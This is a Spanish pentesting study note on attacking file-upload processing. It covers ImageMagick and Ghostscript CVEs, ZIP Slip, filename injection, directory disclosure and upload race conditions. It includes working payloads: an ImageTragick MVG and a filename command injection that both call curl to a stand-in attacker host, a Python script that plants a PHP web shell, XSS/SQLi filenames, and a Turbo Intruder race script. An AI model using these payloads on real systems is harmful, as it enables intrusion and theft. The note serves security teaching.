---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - File-Upload
Fecha de actualización: 2026-06-21
Nota previa: "[[06 - Uploads limitados - SVG, polyglots y metadatos]]"
Nota siguiente: "[[08 - Detección y metodología en entornos reales]]"
Area: "[[File Upload.base|File Upload]]"
---
---

Los vectores anteriores atacan el *contenido* del fichero. Esta nota ataca lo que el servidor **hace** con él: procesarlo con una librería, descomprimirlo, usar su nombre, gestionar la ventana entre validación y borrado. <mark style="background: #FFB86CA6;">En el stack moderno, donde el `.php` directo rara vez ejecuta, estos son los vectores que cobran bounties</mark> —y casi todos son posteriores al módulo original de HTB.

# La librería de procesamiento es el nuevo sink

Si la subida se redimensiona, se convierte o se le extraen metadatos, <mark style="background: #ADCCFFA6;">el objetivo deja de ser el web server y pasa a ser la librería que procesa la imagen</mark>. Basta subir un fichero que dispare su vulnerabilidad:

- **ImageMagick — ImageTragick (`CVE-2016-3714`)**: el clásico, aún vivo en instancias sin `policy.xml` endurecido. Un `.mvg`/`.svg` con un *delegate* malicioso ejecuta comandos:

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.jpg"|curl attacker.oast.fun)'
pop graphic-context
```

- **ImageMagick — `CVE-2022-44268`**: un PNG con un *chunk* `tEXt` cuyo keyword es `profile` y valor una ruta, hace que ImageMagick **embeba el contenido de ese fichero** en la imagen procesada. Lectura arbitraria: subes el PNG, esperas el thumbnail y extraes `/etc/passwd` del resultado con `identify -verbose`.

- **Ghostscript — `CVE-2023-36664` y `CVE-2024-29510`**: ImageMagick delega los PostScript/EPS/PDF a Ghostscript. La primera es *pipe injection* (`%pipe%`); la segunda, *format string* (≤ 10.03.0, corregida en 10.03.1), <mark style="background: #FFB86CA6;">explotada activamente en 2024</mark>. Un EPS con magic bytes de JPEG al inicio pasa el validador de imagen y dispara RCE al procesarse:

```shell-session
$ printf '\xff\xd8\xff' | cat - exploit.ps > exploit.jpg   # JPEG + PostScript
```

- **Pillow (Python) — `CVE-2023-50447`**: RCE vía `ImageMath.eval()` (≤ 10.1.0). El fallo no son los nombres de imagen en sí, sino que `eval()` no valida las **claves** del diccionario `environment`: inyectar claves con *dunders* de Python (`__class__`, `__builtins__`…) —p. ej. a través de nombres de imagen que la app vuelca en ese diccionario— escapa al intérprete. Corregido en 10.2.0.

- **ffmpeg**: un `.avi`/`.m3u8` malicioso puede provocar XXE/SSRF si el servidor transcodifica vídeo (vector real en [HackerOne #1062888, TikTok](https://hackerone.com/reports/1062888)).

> [!warning]+ Identifica el procesador antes de elegir el exploit
> Estos exploits son específicos de librería y versión. Fingerprintea: extensiones aceptadas, transformaciones visibles (¿la imagen sale redimensionada?, ¿con otra calidad?), cabeceras del fichero resultante. Un `policy.xml` bien configurado en ImageMagick neutraliza ImageTragick y los delegados de Ghostscript.

# ZIP Slip

Si la app acepta un archivo comprimido (ZIP, TAR, JAR, WAR, APK) y lo **descomprime sin validar los nombres de entrada**, una entrada con `../` escribe fuera del directorio destino:

```python
import zipfile
with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['cmd']); ?>")
```

<mark style="background: #FF5582A6;">Colocar un web shell en la raíz web da RCE directo.</mark> No es teórico: `CVE-2024-1708` (ConnectWise ScreenConnect) era ZIP Slip y se usó en campañas de ransomware a los pocos días del aviso; `CVE-2024-57728` (SimpleHelp) está en el catálogo KEV de CISA. Es [un patrón de 2018 (Snyk) que sigue apareciendo](https://github.com/snyk/zip-slip-vulnerability) en features de plugins/extensiones. En **Java** (JAR/WAR, importadores Spring, plugins) es donde más se ve: el check ausente es validar `ZipEntry.getName()` contra `..` antes de extraer.

# Inyección en el nombre del fichero

El `filename` lo controlamos por completo, y muchas apps lo usan sin sanear. Según dónde acabe:

- **Command injection** si se mete en un comando del sistema (`mv`, `convert`):

```text
file$(whoami).jpg     file`whoami`.jpg     file.jpg||curl attacker.oast.fun
```

- **Path traversal** para escribir fuera del directorio de uploads: `filename="../../var/www/html/shell.php"` (y variantes URL-encoded `..%2f` / doble `..%252f`).
- **Stored XSS / SQLi** si el nombre se refleja en la UI o entra en una query: `"><script>alert(1)</script>.jpg`, `'-(select sleep(5))-'.jpg`.

Cada caso enlaza con su técnica: [[02 - Operadores de inyección de comandos|command injection]], [[01 - XSS Almacenado|XSS]], [[00 - Introducción a SQL Injection|SQLi]].

# Forzar la divulgación del directorio de uploads

Cuando no vemos dónde aterriza el fichero, provocar **errores** suele revelarlo: subir un nombre que ya existe, un nombre de 5.000 caracteres, o —en Windows— caracteres reservados (`| < > * ?`) y nombres reservados (`CON`, `NUL`, `LPT1`). La convención **8.3** de Windows incluso permite referenciar/sobrescribir ficheros (`WEB~1.CON` es el nombre corto 8.3 de `web.config`). En su defecto, una LFI o el XXE de SVG leen el código fuente para localizar el directorio y el esquema de nombres.

# Race conditions (TOCTOU)

Un patrón de validación inseguro pero frecuente: **mover → escanear → borrar**.

```text
1. move_uploaded_file()  → /uploads/avatar.php   (el fichero YA es accesible)
2. checkFileType()       → analiza
3. unlink()              → borra si es malicioso
```

<mark style="background: #8000E1A6;">Entre los pasos 1 y 3 hay una ventana de milisegundos en la que el web shell existe y se puede ejecutar.</mark> Ganar esa carrera a mano es inviable, pero el **single-packet attack** ([James Kettle, Black Hat USA 2023](https://portswigger.net/research/smashing-the-state-machine)) la vuelve fiable: empaqueta decenas de peticiones HTTP/2 en un solo segmento TCP, eliminando el *jitter* de red. Con Turbo Intruder se sube el shell y se lanzan ~15 accesos en paralelo antes del borrado:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    engine.queue(target.req, gate='race')            # subida
    for i in range(15):
        engine.queue(followupRequest, gate='race')   # accesos al fichero
    engine.openGate('race')
```

El single-packet attack **requiere HTTP/2** en el objetivo (empaqueta las peticiones en un único segmento TCP para eliminar el *jitter* de red). Sin HTTP/2 degenera en un race clásico (sincronización *last-byte* sobre HTTP/1.1 con *keep-alive*), bastante menos fiable.

> [!info]+ Fuentes
> - [PortSwigger Research — Smashing the State Machine / single-packet attack (2023)](https://portswigger.net/research/smashing-the-state-machine) · [lab de race condition en upload](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)
> - [Codean Labs — CVE-2024-29510 (Ghostscript)](https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/) · [Enciphers — CVE-2022-44268 (ImageMagick)](https://www.enciphers.com/exploiting-cve/cve-2022-44268)
> - [Snyk — Zip Slip](https://github.com/snyk/zip-slip-vulnerability) · [Huntress — CVE-2024-1708 (ScreenConnect)](https://www.huntress.com/threat-library/vulnerabilities/cve-2024-1708)
> - [PayloadsAllTheThings — Upload Insecure Files](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)

Conocidos todos los vectores, queda lo que más cuesta en un objetivo real con defensas: **encontrar** la vulnerabilidad. La metodología de [[08 - Detección y metodología en entornos reales|detección]].
